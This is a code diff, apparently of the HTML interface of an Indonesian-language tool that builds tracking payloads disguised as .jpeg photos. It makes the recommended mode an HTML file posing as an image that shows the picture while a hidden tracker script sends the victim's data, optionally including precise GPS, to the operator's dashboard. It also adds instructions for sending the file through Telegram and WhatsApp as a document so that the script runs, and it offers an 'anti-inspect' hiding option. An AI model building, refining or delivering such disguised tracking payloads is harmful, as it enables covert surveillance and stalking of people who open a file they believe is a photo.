@@ -248,14 +248,14 @@ textarea.code{width:100%;background:#000;border:0;color:var(--ac2);font-family:v
       <div class="hint" id="dropHint"><b>KLIK / DROP</b> foto disini — foto ini yang akan terlihat oleh target</div>
       <input type="file" id="fileImg" accept="image/*" class="hidden">
     </div>
-    <div class="notice">Payload yang di-generate adalah file <b>.jpeg</b> berisi foto + script pelacak tertanam. Saat target download lalu membukanya (klik file → terbuka di browser/Telegram), semua data langsung nyasar ke dashboard ini. Foto asli tetap tampil normal.</div>
+    <div class="notice">Payload adalah file <b>.jpeg</b> berisi foto + script pelacak. <b style="color:var(--good)">KIRIM SEBAGAI FILE/DOKUMEN</b>, jangan dari galeri foto — kalau di-attach sebagai foto, chat cuma nampilin preview gambar dan script nggak bisa jalan. Saat target buka file-nya, foto tampil normal dan semua data langsung nyasar ke dashboard ini.</div>
   </div>
 
   <div class="bcard">
     <h3><span class="n">2</span> MODE PAYLOAD</h3>
     <div class="modes" id="modes">
-      <div class="mode on" data-mode="polyglot"><b>POLYGLOT JPEG (.jpeg) ✓</b><span>Byte JPEG asli + script nempel. Foto kebuka normal di SEMUA viewer, script jalan saat dibuka via browser/chat. Paling aman dari korup.</span></div>
-      <div class="mode" data-mode="disguise"><b>PHOTO-DISGUISE (.jpeg)</b><span>File HTML disamarkan jadi .jpeg. Buka di browser/Telegram = JS jalan pasti, foto tampil via tag img.</span></div>
+      <div class="mode on" data-mode="disguise"><b>PHOTO-DISGUISE (.jpeg) ✓ REKOMENDASI</b><span>Muncul sebagai FILE/DOKUMEN di chat → target buka → foto tampil + script jalan → data masuk dashboard. WAJIB di-attach sebagai FILE (jangan dari galeri foto).</span></div>
+      <div class="mode" data-mode="polyglot"><b>POLYGLOT JPEG+HTML</b><span>JPEG asli + script nempel. Di chat muncul sebagai PREVIEW FOTO (nampilin foto polos). Script cuma jalan kalau file dibuka lewat browser/webview — preview foto doang nggak ke-scan.</span></div>
       <div class="mode" data-mode="script"><b>RAW SCRIPT</b><span>Hanya kode pelacak mentah. Tempel ke halaman HTML/php buatan sendiri.</span></div>
     </div>
   </div>
@@ -272,6 +272,15 @@ textarea.code{width:100%;background:#000;border:0;color:var(--ac2);font-family:v
     <div class="checks" style="margin-top:14px">
       <label><input type="checkbox" id="bGeo"> minta izin GPS target (lokasi presisi)</label>
       <label><input type="checkbox" id="bHide" checked> sembunyikan script (anti-inspect)</label>
+    </div>
+  </div>
+
+  <div class="bcard">
+    <h3>⟿ CARA KIRIM YANG BENER</h3>
+    <div class="notice" style="margin:0">
+      <b>Telegram:</b> chat → ikon 📎 (attach) → <b>FILE</b> → pilih payload .jpeg. Jangan pakai ikon foto/gambar.<br>
+      <b>WhatsApp:</b> ikon 📎 → <b>DOKUMEN</b> → pilih payload → kirim (jangan dari galeri langsung).<br>
+      Kalau terlanjur ke-send sebagai foto/preview → script nggak jalan. Target buka file-nya (klik di chat) → foto tampil + data masuk dashboard.
     </div>
   </div>
 
